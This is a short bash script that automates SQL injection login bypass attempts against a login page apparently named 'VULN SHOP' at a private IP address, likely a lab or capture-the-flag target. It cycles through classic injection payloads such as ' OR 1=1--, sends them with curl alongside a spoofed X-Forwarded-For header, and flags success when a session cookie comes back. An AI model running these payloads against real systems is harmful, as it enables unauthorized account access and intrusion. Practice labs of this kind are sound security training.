#!/bin/bash
# SQL Injection Login Bypass Script
# Target: VULN SHOP Login Page

TARGET="http://10.210.136.53:3000"
MY_IP="10.0.0.101"

echo "[*] SQL Injection Login Bypass Test"
echo "[*] Target: $TARGET/login"
echo ""

# Test different SQL injection payloads
payloads=(
    "admin' OR '1'='1' --"
    "admin'--"
    "' OR 1=1--"
    "admin' OR '1'='1"
    "' OR ''='"
)

for payload in "${payloads[@]}"; do
    echo "[*] Testing payload: $payload"
    response=$(curl -s -i -X POST \
        -H "X-Forwarded-For: $MY_IP" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$payload&password=anything" \
        "$TARGET/login" 2>&1)

    if echo "$response" | grep -q "Set-Cookie: user="; then
        echo "[+] SUCCESS! Payload worked"
        echo "$response" | grep "Set-Cookie"
        echo ""
    else
        echo "[-] Failed"
    fi
done
